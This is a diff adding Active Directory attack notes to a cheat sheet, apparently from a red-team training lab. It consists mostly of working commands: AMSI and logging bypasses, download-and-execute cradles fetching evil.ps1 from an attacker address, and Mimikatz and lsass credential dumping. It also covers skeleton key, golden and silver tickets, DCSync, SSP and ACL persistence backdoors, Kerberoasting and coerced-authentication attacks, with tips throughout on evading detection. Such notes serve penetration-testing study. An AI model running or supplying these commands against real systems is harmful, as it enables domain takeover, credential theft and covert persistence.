@@ -917,3 +917,822 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation`*Enumerating for SPN Ac
 
 # AS-REP Roasting
 `python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt`*Performing an AS-REP Roasting Attack against Users List*
+
+###### Needed to be merged with the above ones #######
+### General way 1: of opsec.
+# Step 1: Bypass script block logging and all the other logging staff
+# Step 2: Bypass AMSI
+# Step 3: Do whatever
+
+### General way 2: of opsec.
+# When an admin is running as a service on a machine we can extract clear text pass with sekurlsa::ekeyes.
+
+### Thinks to remember 3: opsec
+If our target is 2016 and before then after using a golden ticket or a silver ticket we cant use winrs or powershell remoting however u can still run commands using wmi (`gwmi -C win32_computersystem -ComputerName dcorp-dc`). If its 2019 ++ you have no problem.
+
+### Thinks to remember 4: opsec
+Using silver ticket might be fancy becuase Miscrosoft MDI doesnt care about silver tickets and in some cases we dont touch the DC but our persistence period by default is 30 days for computer accounts. Also have in mind that if we want to do multiple things even when targeting a DC(not recommended) we have to create different tickets for different purposes(ex: HOST to create a schtask)
+
+### Thinks to remember 5: opsec
+If you try to create a silver ticket and use /service:HTTP in order to use winrm it wont work if its 2016.
+
+###  Thinks to remember 6: opsec
+When you get access to a new user it is worth checking if he/she has local admin access to any other machine
+
+### Thinks to remember 7: opsec
+In cases you run sekurlsa::ekeys and if you find many aes keys for the same user check the SID always, and for example in case of a resource based constrained delegated scenario would pick S-1-5-18 which is the admin one !
+
+### Thinks to remember 8: opsec
+Use silver tickets for staying under the radar dont do stupidities like adding ur account to domain admin group with that, be smart.
+
+### Thinks to remember 9: opsec
+Kerboroasting on the best attacks for staying under the radar, if you manage to guess the pass(I mean its RC4 ... hope you do it !)
+
+### Thinks to remember 10: opsec
+ACL attacks are interesting and very profitable, i would also say that there are stealthier than others.
+
+## Thinks to remember 11: opsec
+Credential theft protections(Credential Guard,Protected users group) are not protecting against extracting credential from the registry, only from lsass. Credentials for local accounts in SAM and Service account
+credentials from LSA Secrets are NOT protected.
+
+### Behavioural bypassing
+## Scenario 1: We have remote access to another machine and we want to use a binary to download something and execute it in the memory. An executable trying to download another executable or something from a remote server will trigger bevaviour base detection from defender. Instead portforward your own port and download it from 127.0.0.1 which will not be a remote server.
+**Example:**
+`winrs -r;dcorp-mgmt hostname:whoami` -> "From our machine exec on the other machine"
+`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe` "Download on our machine"
+`echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe` "Copy on the rmt machine"
+`winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.1/Loader.exe sekurlsa::ekeys exit` "Wrong way as executable tries to download another executable and run it from 'remote server'"
+`winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.16.100.1`"Correct way as we forward our port as the remote machine localhost port access, so it seems that the remote machine is downloading from itself and not from a remote server"
+############################################################################
+### Noisy commands that and should be avoided :
+## Scenario 2: In general the idea is when you ask something from the DC and you spam all the machines in the network you will leave logs on all the machines and you will cause a network spike.
+
+ # Find shares on hosts in current domain.
+Invoke-ShareFinder–Verbose
+# Find sensitive files on computers in the domain
+Invoke-FileFinder–Verbose
+# Get all fileservers of the domain
+Get-NetFileServer
+Also when run Commands for finding local admin rights on other machines is also noisy.
+# Find all machines on the current domain where the current user has local admin access ( also Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1)
+Find-LocalAdminAccess–Verbose
+# Find computers where a domain admin (or specified user/group) has sessions:
+Find-DomainUserLocation -Verbose
+Find-DomainUserLocation -UserGroupIdentity "RDPUsers"
+
+# Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess).
+Find-DomainUserLocation -CheckAccess
+
+# Supply data to BloodHound:
+. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+
+# Skeleton Key ( too much noise for nothing) Use the below command to inject a skeleton key (password would be mimikatz, want to change that change mimi source code and put ur own) on a Domain Controller of choice. DA privileges required
+`Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
+# Now, it is possible to access any machine with a valid username and password as "mimikatz"
+`Enter-PSSession–Computername dcorp-dc–credential dcorp\Administrator`
+
+# In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
+`mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # misc::skeleton
+mimikatz # !-`
+# Note that above would be very noisy in logs - Service installation (Kernel mode driver)
+
+# There is a local administrator on every DC called DSRM "Administrator" whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server ispromoted to Domain Controller and it is rarely changed. Dump DSRM password (needs DA privs)
+`Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc`
+# Compare the Administrator hash with the Administrator hash of below command
+`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc`
+# But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash
+`Enter-PSSession -Computername dcorp-dc`
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD( WHAT ARE YOU DOING you are making a user not allowed to logon remote to do so, you are not supposed to introduce extra vulns, stop it get some help !)
+# Use below command to pass the hash
+`Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'`
+`ls \\dcorp-dc\C$`
+##############################################################
+
+# When looking for domain admins you should always check the SID if the last three digits are 500, because someone might have renamed him. On the other hand on a non-domain machine when you are not local admin, you cant find that if they are renamed.
+
+
+# We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
+winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
+
+# Load a PowerShell script using dot sourcing
+`. C:\AD\Tools\PowerView.ps1`
+# A module (or a script) can be imported with:
+` Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`
+# All the commands in a module can be listed with:
+`Get-Command -Module <modulename>`
+# Download execute cradle
+`iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')`
+`$ie=New-Object -ComObject
+InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1
+');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`
+
+`iex (iwr 'http://192.168.230.1/evil.ps1')`
+
+`$h=New-Object -ComObject
+Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
+$h.responseText
+`
+`$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
+$r = $wr.GetResponse()
+IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()`
+
+# (https://github.com/Flangvik/NetLoader) to deliver our binary payloads. It can be used to load binary from filepath or URL and patch AMSI & ETW while executing.
+`C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
+# We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL.
+C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
+
+# Several ways to bypass execution policy
+
+`powershell–ExecutionPolicy bypass`
+`powershell–c <cmd>`
+`powershell–encodedcommand`
+`$env:PSExecutionPolicyPreference="bypass"`
+
+# The ActiveDirectory PowerShell module (MS signed and works even in PowerShell CLM)
+https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps
+https://github.com/samratashok/ADModule
+`Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll`
+`Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`
+
+# Evade powershell logging and AMSI bypass (https://github.com/OmerYa/Invisi-Shell)
+-> Patches AMSI
+-> System wide transcription
+-> Script block logging
+
+## Domain Enumeration
+
+# Get current domain
+Get-Domain (PowerView)
+Get-ADDomain (ActiveDirectory Module)
+
+# Get object of another domain
+Get-Domain–Domain moneycorp.local
+Get-ADDomain-Identity moneycorp.local
+# Get domain SID for the current domain
+Get-DomainSID
+(Get-ADDomain).DomainSID
+
+# Get domain policy for the current domain
+Get-DomainPolicyData
+(Get-DomainPolicyData).systemaccess
+# Get domain policy for another domain
+(Get-DomainPolicyData–domain
+moneycorp.local).systemaccess
+
+# Get domain controllers for the current domain
+Get-DomainController
+Get-ADDomainController
+# Get domain controllers for another domain
+Get-DomainController–Domain moneycorp.local
+Get-ADDomainController -DomainName moneycorp.local -Discover
+
+# Get a list of users in the current domain
+Get-DomainUser
+Get-DomainUser–Identity student1
+
+Get-ADUser -Filter * -Properties *
+Get-ADUser -Identity student1 -Properties *
+
+# Get list of all properties for users in the current domain
+`Get-DomainUser -Identity student1 -Properties *
+Get-DomainUser -Properties samaccountname,logonCount
+Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -
+MemberType *Property | select Name
+Get-ADUser -Filter * -Properties * | select
+name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset
+)}}`
+
+# Get all the groups in the current domain
+Get-DomainGroup | select Name
+Get-DomainGroup–Domain <targetdomain>
+
+Get-ADGroup -Filter * | select Name
+Get-ADGroup -Filter * -Properties *
+
+# Get all groups containing the word "admin" in group name
+Get-DomainGroup *admin*
+Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
+
+
+# Check for active users with high logoncount, bad idea to target low logoncount users.
+`Get-DomainUser -Properties samaccountname,logonCount`
+
+# Check descriptions for passwords or other interesting
+
+`Get-DomainUser -LDAPFilter "Description=*pass*" | Select name,Description`
+
+# Get a list of computers in the current domain
+`Get-DomainComputer | select Name
+Get-DomainComputer–OperatingSystem "*Server 2016*"
+Get-DomainComputer -Ping
+Get-ADComputer -Filter * | select Name
+Get-ADComputer -Filter * -Properties *
+Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
+Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}`
+
+# Get all the groups in the current domain
+Get-DomainGroup | select Name
+Get-DomainGroup–Domain <targetdomain>
+Get-ADGroup -Filter * | select Name
+Get-ADGroup -Filter * -Properties *
+# Get all groups containing the word "admin" in group name
+Get-DomainGroup *admin*
+Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
+
+# Get all the members of the Domain Admins group
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+Get-ADGroupMember -Identity "Domain Admins" -Recursive
+# Get the group membership for a user:
+Get-DomainGroup–UserName "student1"
+Get-ADPrincipalGroupMembership -Identity student1
+
+# List all the local groups on a machine (needs administrator privs on non-dc
+machines) :
+Get-NetLocalGroup -ComputerName dcorp-dc -ListGroups
+
+# Get members of all the local groups on a machine (needs administrator privs on
+non-dc machines)
+Get-NetLocalGroup -ComputerName dcorp-dc -Recurse
+#  Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines) :
+Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
+
+# Get actively logged users on a computer (needs local admin rights on the target)
+Get-NetLoggedon–ComputerName <servername>
+# Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
+Get-LoggedonLocal -ComputerName dcorp-dc
+#  Get the last logged user on a computer (needs administrative rights and
+remote registry on the target)
+Get-LastLoggedOn–ComputerName <servername>
+
+
+
+# Get list of GPO in current domain.
+Get-DomainGPO
+Get-DomainGPO -ComputerIdentity dcorp-student1
+
+# Get GPO(s) which use Restricted Groups or groups.xml for interesting users ( IF DOMAIN GROUP IS ADDED TO LOCAL GROUP, THIS CAN GIVE AN ATTACK PATH. IF you be a part of that group you can have local admin rights on this machine)
+Get-DomainGPOLocalGroup
+
+# Get users which are in a local group of a machine using GPO
+Get-DomainGPOComputerLocalGroupMapping–ComputerIdentity
+dcorp-student1
+# Get machines where the given user is member of a specific group
+Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
+
+# Get OUs in a domain
+Get-DomainOU
+Get-ADOrganizationalUnit -Filter * -Properties *
+# Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
+Get-DomainGPO -Identity "{AB306569-220D-43FF-B03B-83E8F4EF8081}"
+
+# Get the ACLs associated with the specified object
+Get-DomainObjectAcl -SamAccountName student1–ResolveGUIDs
+# Get the ACLs associated with the specified prefix to be used for search
+Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain
+Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
+# We can also enumerate ACLs using ActiveDirectory module but without resolving
+GUIDs
+(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
+
+# Search for interesting ACEs
+Find-InterestingDomainAcl -ResolveGUIDs
+# Get the ACLs associated with the specified path
+Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
+
+# Get a list of all domain trusts for the current domain
+Get-DomainTrust
+Get-DomainTrust–Domain us.dollarcorp.moneycorp.local
+
+Get-ADTrust
+Get-ADTrust–Identity us.dollarcorp.moneycorp.local
+
+# Get details about the current forest
+Get-Forest
+Get-Forest–Forest eurocorp.local
+Get-ADForest
+Get-ADForest–Identity eurocorp.local
+# Get all domains in the current forest
+Get-ForestDomain
+Get-ForestDomain–Forest eurocorp.local
+(Get-ADForest).Domains
+
+# Get all global catalogs for the current forest
+Get-ForestGlobalCatalog
+Get-ForestGlobalCatalog–Forest eurocorp.local
+Get-ADForest | select -ExpandProperty GlobalCatalogs
+# Map trusts of a forest
+Get-ForestTrust
+Get-ForestTrust–Forest eurocorp.local
+Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
+
+# Find computers (File Servers and Distributed File servers) where a domain admin session is available.
+Find-DomainUserLocation –Stealth
+
+# BloodHound : To avoid detections like ATA
+Invoke-BloodHound -CollectionMethod All -ExcludeDC
+
+## Priv esc 
+# Get services with unquoted paths and a space in their name.
+Get-ServiceUnquoted -Verbose
+# Get services where the current user can write to its binary path or
+change arguments to the binary
+Get-ModifiableServiceFile-Verbose
+# Get the services whose configuration current user can modify.
+Get-ModifiableService-Verbose
+
+# PowerUp
+Invoke-AllChecks
+# Privesc:
+Invoke-PrivEsc
+# PrivescCheck:
+Invoke-Privesc Check
+# PEASS-ng:
+winPEASx64.exe
+
+# PowerShell Remoting Use below to execute commands or scriptblocks:
+Invoke-Command–Scriptblock {Get-Process} -ComputerName
+(Get-Content <list_of_servers>)
+# Use below to execute scripts from files
+Invoke-Command–FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
+
+# Use below to execute locally loaded function on the remote machines:
+Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
+# In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:
+Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
+# a function call within the script is used:
+Invoke-Command–Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
+
+# execute "Stateful" commands using Invoke-Command:
+$Sess = New-PSSession–Computername Server1
+Invoke-Command–Session $Sess–ScriptBlock {$Proc = Get-Process}
+Invoke-Command–Session $Sess–ScriptBlock {$Proc.Name}
+
+# We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
+winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
+
+# Dump credentials on a local machine using Mimikatz.
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+# Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
+SafetyKatz.exe "sekurlsa::ekeys"
+# Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
+SharpKatz.exe --Command ekeys
+# Dump credentials using Dumpert (Direct System Calls and API unhooking)
+rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+
+# Using pypykatz (Mimikatz functionality in Python)
+pypykatz.exe live lsa
+# Using comsvcs.dll (lol bin to bypass application white list)
+tasklist /FI "IMAGENAME eq lsass.exe"
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
+<lsass process ID> C:\Users\Public\lsass.dmp full
+
+
+# Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation(Run as administrator)
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
+
+SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
+## The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).
+
+#  Below doesn't need elevation ( This overwrites the current tickets)
+Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
+#  Below command needs elevation ( This starts a new process and if you run whoami you will not see ur impersonated admin privs. Because the proccess starts with logon type 9 so new credentials are used when you access network resources !)
+Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+# To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:
+`Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`
+SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+
+### Obfuscation
+For Rubeus.exe, use ConfuserEx (https://github.com/mkaring/ConfuserEx) to obfuscate the binary.
+
+
+# Execute mimikatz on DC as DA to get krbtgt hash
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'–Computername dcorp-dc
+
+
+# Golden ticket :
+`Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"`z *Explanation : name of the module,Username for which the TGT is generated (use an active domain admin with high logon count),Domain FQDN,SID of the domain,NTLM (RC4) hash of the krbtgt account or Use /aes128 and
+/aes256 for using AES keys which is MORE SILENT,Optional User RID (default 500) and Group default 513 512 520 518 519),Injects the ticket in current PowerShell process - no need to
+save the ticket on disk(Stealthier due the time validation time taken to validite the TGT),Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future, Optional ticket lifetime (default is 10 years) in minutes.The default AD setting is 10 hours = 600 minutes,Optional ticket lifetime with renewal (default is 10 years)in minutes. The default AD setting is 7 days = 100800*
+
+# Silver ticket (Similar command can be used for any other service on a machine.Which services? HOST, RPCSS, HTTP and many more):
+`Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'` The only diff with the command above is this : /target:dcorp-dc.dollarcorp.moneycorp.local Target server FQDN, /service:cifs The SPN name of service for which TGS is to be created)
+
+# Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server. Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages. All local logons on the DC are logged to
+C:\Windows\system32\kiwissp.log
+`$packages = Get-ItemProperty
+HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
+$packages += "mimilib"
+Set-ItemProperty
+HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
+Packages' -Value $packages
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
+'Security Packages' -Value $packages`
+
+
+# (Persisting through AD Group Templates)
+## Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
+`Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
+## Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder( Go for what you exactly need and not the full permisions):
+`Add-DomainObjectAcl -TargetIdentity'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
+
+`Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
+
+## Using ActiveDirectory Module and RACE toolkit
+(https://github.com/samratashok/RACE) :
+`Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'-Verbose`
+
+## Check (if what we did before worked or not) the Domain Admins permission - PowerView as normal user:
+Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
+## Using ActiveDirectory Module:
+(Get-Acl -Path 'AD:\CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$.IdentityReference -match 'student1'}
+
+## Moreover now we can abuse :Abusing FullControl using PowerView:
+`Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose`
+## Using ActiveDirectory Module:
+`Add-ADGroupMember -Identity 'Domain Admins' -Members testda`
+
+## Abusing ResetPassword using PowerView:
+`Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`
+## Using ActiveDirectory Module:
+`Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`
+
+# Persisting though ACL security descriptors-securable objects for example remote access methods(really stealth way, as i think there is no way of detecting that)(One problem coulb be if u backdoor dc with a low pri acc, you have to have a way to priv esc)
+ 
+## ACLs can be modified to allow non-admin users access to securable objects.(YOU HAVE TO BE DOMAIN ADMIN in a DC FOR EXAMPLE TO ADD REMOTE user ) Using the RACE toolkit:
+`. C:\AD\Tools\RACE-master\RACE.ps1`
+# On local machine for student1:
+`Set-RemoteWMI -SamAccountName student1 -Verbose`
+# On remote machine for student1 without explicit credentials:
+`Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose`(you can ignore the whole "–namespace 'root\cimv2'" and will be applied to root namespace.)
+# On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
+`Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator–namespace 'root\cimv2' -Verbose`
+# On remote machine remove permissions:
+`Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose`
+
+# On local machine for student1:
+` Set-RemotePSRemoting -SamAccountName student1 -Verbose`
+# On remote machine for student1 without credentials:
+`Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose`
+# On remote machine, remove the permissions:
+`Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove`
+
+# Using RACE or DAMP, with admin privs on remote machine (backdoor registry in order to dump hashes from a remote machine so after that create a silver ticket with rce to your target machine)
+`Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose`
+# As student1, retrieve machine account hash:
+`Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose`
+# Retrieve local account hash:
+`Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose`
+# Retrieve domain cached credentials:
+`Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose`
+
+# Kerberoasting: Find user accounts used as Service accounts there is no need that this service is actually running a service on a machine, if it has the SPN property populated it is a service acc(as a domain user you can request any tgs without having special priviledges)
+## ActiveDirectory module
+`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
+## PowerView
+`Get-DomainUser–SPN`
+
+## Use Rubeus to list Kerberoast stats
+`Rubeus.exe kerberoast /stats`
+## Use Rubeus to request a TGS
+`Rubeus.exe kerberoast /user:svcadmin /simple`
+## To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of ATA - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC
+`Rubeus.exe kerberoast /stats /rc4opsec` (Reccomended onellll)
+`Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec`
+## Kerberoast all possible accounts
+`Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt`
+
+## Kerberoasting - AS-REPs  you might face that in cases of Oracle,products,workstations that are not windows,or some vpn staff) Enumerating accounts with Kerberos Preauth disabled (https://github.com/HarmJ0y/ASREPRoast)
+## Using PowerView:
+`Get-DomainUser -PreauthNotRequired -Verbose`
+## Using ActiveDirectory module:
+`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
+## If our user has perimisions to Force disable Kerberos Preauth maybe on another user group we can do that : Let's enumerate the permissions for RDPUsers on ACLs using PowerView and disable pre-auth on Controlusers:
+`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}` 
+`Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose`
+`Get-DomainUser -PreauthNotRequired -Verbose`
+
+##  Request encrypted AS-REP for offline brute-force. Let's use ASREPRoast
+`Get-ASREPHash -UserName VPN1user -Verbose`
+## To enumerate all users with Kerberos preauth disabled and request a hash
+`Invoke-ASREPRoast -Verbose`
+## We can use John The Ripper to brute-force the hashes offline
+`john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt`
+
+
+## You can request TGS for every account SPN not set to null With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the forest and should be like " random/whoami1 " random would be the service name and whoami1 would be the FQDN of the target server) We can then request a TGS without special privileges. The TGS can then be "Kerberoasted"
+
+## Let's enumerate the permissions for RDPUsers on ACLs using PowerView (dev):
+`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
+## Using Powerview (dev), see if the user already has a SPN:
+`Get-DomainUser -Identity supportuser | select serviceprincipalname`
+## Using ActiveDirectory module:
+`Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`
+
+## Set a SPN for the user (as said above)
+`Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}`
+## Using ActiveDirectory module:
+`Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}`
+
+## Kerberoast the user
+`Rubeus.exe kerberoast /outfile:targetedhashes.txt`
+
+
+# Kerberos Delegation
+## UNCONSTRAINED DELEGATION
+
+# The idea is Discover domain computers which have unconstrained delegation enabled using PowerView :
+`Get-DomainComputer -UnConstrained`
+## Using ActiveDirectory module:
+`Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
+`Get-ADUser -Filter {TrustedForDelegation -eq $True}`
+
+## Compromise the server(s) where Unconstrained delegation is enabled and get admin privs. We must trick or wait for a domain admin to connect a service on appsrv. Now, if the command is run again:
+`Invoke-Mimikatz–Command '"sekurlsa::tickets /export"'`
+## The DA token could be reused:
+`Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'`
+
+## PRINTER-BUG A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.
+
+## We can capture the TGT of dcorp-dc$ by using Rubeus (https://github.com/GhostPack/Rubeus) on dcorp-appsrv:
+`Rubeus.exe monitor /interval:5 /nowrap`
+## And after that run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on the student VM:
+`MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local\\dcorp-appsrv.dollarcorp.moneycorp.local`
+
+## We can also use PetitPotam.exe (https://github.com/topotam/PetitPotam) on dcorp-appsrv, PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC(so that can be done through a non-domain machine and the function runs even if the service is not enabled:
+`PetitPotam.exe dcorp-appsrv dcorp-dc`
+## On dcorp-appsrv:
+`Rubeus.exe monitor /interval:5`
+## Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
+`Rubeus.exe ptt /tikcet:`
+## Once the ticket is injected, run DCSync:
+`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`
+
+## CONSTRAINED DELEGATION 
